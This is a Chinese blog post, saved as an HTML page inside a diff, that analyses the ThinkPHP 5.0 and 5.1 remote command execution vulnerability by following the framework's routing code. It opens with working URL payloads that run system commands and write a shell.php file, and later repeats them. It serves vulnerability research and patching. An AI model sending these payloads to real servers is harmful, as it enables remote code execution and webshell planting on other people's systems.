@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x01 漏洞利用方式5.0版本POC（不唯一）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 5.0 &amp; 5.1远程命令执行漏洞利用分析">
+<meta property="og:url" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Cyc1e&#39;s Blog">
+<meta property="og:description" content="0x01 漏洞利用方式5.0版本POC（不唯一）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7fc1e93a2a0a36d2-1583322083188.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-45d43f5b8b9de119.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-6c096399e25f84b7.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-acfd70f549919220.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7ce5cfc6d18a20dd.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-8af1effac8ce52c2.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7befd70637eb95d8.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-4fc3337a8109beaf.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-24530b9cc6bcb1b6.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7d645035cf4370c4.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-128ecac19dded730.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-f480d5d4f6d5690e.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-99aa7524968a38ab.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-07e89c869dad893a.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-421115b8dd62a04c.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-4ca3c727765e9aa9.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-1f04a555594188ec.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-0b758b746098057e.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-ccdb8cfa53ac94f7.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-38f8d87c894429d4.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-2a47a46b95e5af6b.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-b7e6f442b42a7dac.png">
+<meta property="og:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-28e6c65aa5f32ad0.png">
+<meta property="article:published_time" content="2018-12-13T11:46:02.000Z">
+<meta property="article:modified_time" content="2020-03-04T11:44:52.302Z">
+<meta property="article:author" content="Cyc1e">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7fc1e93a2a0a36d2-1583322083188.jpg">
+
+<link rel="canonical" href="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>ThinkPHP 5.0 & 5.1远程命令执行漏洞利用分析 | Cyc1e's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Cyc1e's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Cyc1e's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="Cyc1e">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cyc1e's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP 5.0 & 5.1远程命令执行漏洞利用分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-12-13 19:46:02" itemprop="dateCreated datePublished" datetime="2018-12-13T19:46:02+08:00">2018-12-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-04 19:44:52" itemprop="dateModified" datetime="2020-03-04T19:44:52+08:00">2020-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Cyc1e%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E8%B7%AF/" itemprop="url" rel="index"><span itemprop="name">Cyc1e的漏洞分析之路</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x01-漏洞利用方式"><a href="#0x01-漏洞利用方式" class="headerlink" title="0x01 漏洞利用方式"></a>0x01 漏洞利用方式</h1><p><strong>5.0版本POC（不唯一）</strong></p>
+<blockquote>
+<p>命令执行：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]<br>文件写入：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=<?php phpinfo();?></p>
+</blockquote>
+<p><strong>5.1版本POC（不唯一）</strong></p>
+<blockquote>
+<p>命令执行：?s=index/\think\Request/input&amp;filter=system&amp;data=[系统命令]<br>文件写入：?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<?php phpinfo();?></p>
+</blockquote>
+<p>#0x02 漏洞分析<br>版本： Thinkphp v5.1.29（影响版本&lt;5.1.31和&lt;5.0.23）<br>本次分析环境：PHP/7.0.12 + Apache2</p>
+<p>ThinkPHP官方在12月9日发布了5.*版本的更新，更新说明“由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞”，所以漏洞的触发在路由调度时,thinkphp中由函数pathinfo()来获取路由，定位函数查看：/thinkphp/library/think/Request.php：678行 </p>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7fc1e93a2a0a36d2-1583322083188.jpg" alt="pathinfo"></p>
+<p>其中在文件31行定义了var_pathinfo的默认值为s ：</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line"><span class="string">'var_pathinfo'</span>   =&gt; <span class="string">'s'</span></span><br></pre></td></tr></table></figure>
+<p>所以当请求报文中以GET形式传入s参数是，则将其值作为pathinfo。全局查找pathinfo()函数的调用情况，可以发现同文件下path函数对其进行调用，定位path()函数查看：/thinkphp/library/think/Request.php：716行<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-45d43f5b8b9de119.jpg" alt></p>
+<p>调用pathinfo()函数获取路由信息，并将返回值赋值给了$this-&gt;path，所以我们可以控制该变量，即path()函数的返回值，继续跟踪path函数的调用情况，定位函数routecheck()：/thinkphp/library/think/App.php：583行</p>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-6c096399e25f84b7.png" alt></p>
+<p>该函数进行路由检测，且将我们可控的$path变量传递到了check()函数中进行处理，定位查看check()函数：/thinkphp/library/think/Route.php：877行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-acfd70f549919220.png" alt></p>
+<p>这里我们就可以看出为何官方说明，在开启强制路由的情况下不受该漏洞的影响，如果开启强制路由，则check处理传入的由我们构造的$url变量时会实例化RouteNotFoundException对象，即报出对应的错误。</p>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7ce5cfc6d18a20dd.png" alt></p>
+<p>而默认路由解析情况下，check()函数实例化了UrlDispatch对象，并将$url传递给了构造函数进行处理，UrlDispatch继承Dispatch，分析其父类Dispatch的构造函数，跟踪查看：library/think/route/Dispatch.php：64行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-8af1effac8ce52c2.png" alt></p>
+<p>传入的$dispatch变量值赋值给了$this-&gt;dispatch,全局收索$this-&gt;diapatch的处理情况，最终会传入Url类中的init()函数进行处理，跟踪查看init()函数：/thinkphp/library/think/route/dispatch/Url.php：20行</p>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7befd70637eb95d8.png" alt></p>
+<p>init()函数调用parseUrl()函数对$this-&gt;diapatch变量进行处理，跟踪查看：/thinkphp/library/think/route/dispatch/Url.php：37行</p>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-4fc3337a8109beaf.png" alt></p>
+<p>ParseUrl()函数又将变量传入到了parseUrlPath()函数中，继续定位查看parseUrlPath()函数：/thinkphp/library/think/route/Rule.php：951行</p>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-24530b9cc6bcb1b6.png" alt></p>
+<p>利用‘/’对$url变量进行分割，且$url的格式为‘模块/控制器/操作’，将$url分割后的值存放在$path变量当中，并返回到parseUrl()函数，最终返回到Url类中init()函数: /thinkphp/library/think/route/dispatch/Url.php：20行</p>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7d645035cf4370c4.png" alt></p>
+<p>最终分割后封装好的路由信息数组传递到了$result变量中，随后传递到了Module的构造函数进行处理，由于Module的父类也是Dispatch，即将$result值传递给了变量$this-&gt;dispatch，随后调用Module类的init()函数对$this-&gt;dispatch进行处理，定位查看：/thinkphp/library/think/route/dispatch/Module.php：27行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-128ecac19dded730.png" alt></p>
+<p>在初始化模块的判断语句中，对$module进行判断，则需要$available的值为true，即需要is_dir($this-&gt;app-&gt;getAppPath() . $module 的判断条件成立，由于默认模块是index，所以入口模块为index，也可以用‘.’进行替换。$this-&gt;dispatch的值最终传递到$this-&gt;controller中，init()函数处理完过后，进入exec()函数，查看函数代码: /thinkphp/library/think/route/dispatch/Module.php：85行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-f480d5d4f6d5690e.png" alt></p>
+<p>exec()函数将变量$this-&gt;controller传递给了controller()函数进行处理，继续跟踪controller()进行查看：/thinkphp/library/think/App.php：720行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-99aa7524968a38ab.png" alt></p>
+<p>该函数中的$name变量是由我们控制的，随后调用parseModuleAndClass()函数对其进行出来，跟进parseModuleAndClass()函数：/thinkphp/library/think/App.php：641行<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-07e89c869dad893a.png" alt></p>
+<p>当$name中存在’\’时，直接将$name值赋给$class，然后实例化$class，并返回，这里可能有些人不知道为什么会实例化$class，在parseModuleAndClass()函数执行后返回到controller()函数中<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-421115b8dd62a04c.png" alt></p>
+<p>其中返回了$class变量，所以调用魔术方法<strong>get()函数进行处理，App类是继承于Container的，所以可以去查看Container类中的魔术方法</strong>get（）</p>
+<blockquote>
+<p>   public function __get($name)<br>     {<br>         return $this-&gt;make($name);<br>     }</p>
+</blockquote>
+<p>__get()调用了make()函数，跟踪查看：/thinkphp/library/think/Container.php：260行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-4ca3c727765e9aa9.png" alt><br>make()将传入的传入的变量实例化为一个类，即controller()中$name为我们可以控制的值，可以通过构造$name变量来实例化任何一个类，所以我们可以通过构造s=index/\think\class/method来实例化\think\class类并且执行该类的method方法达到控制程序流，由于Rule.php中parseUrlPath()函数中：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$url</span> = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, <span class="symbol">$url</span>);</span><br></pre></td></tr></table></figure>
+
+<p>所以也可以使用’|’进行进行构造，即index|\think\class|method。在\think\Request类中找到可以利用的方法input:<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-1f04a555594188ec.png" alt></p>
+<p>通过构造payload：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="meta">index</span>/\think\Request/<span class="meta">input</span><span class="variable">&amp;filter</span>=phpinfo<span class="variable">&amp;data</span>=1</span><br></pre></td></tr></table></figure>
+<p>即可调用phpinfo函数，调用system()函数便可以任意命令执行。<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-0b758b746098057e.png" alt></p>
+<p>在\think\template\driver\file类中找到可以任意写文件的方法write:<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-ccdb8cfa53ac94f7.png" alt></p>
+<p>所以通过构造payload：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=<span class="meta">index</span>/\think\template\driver\<span class="meta">file</span>/write<span class="variable">&amp;cacheFile</span>=shell.php<span class="variable">&amp;content</span>=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-38f8d87c894429d4.png" alt></p>
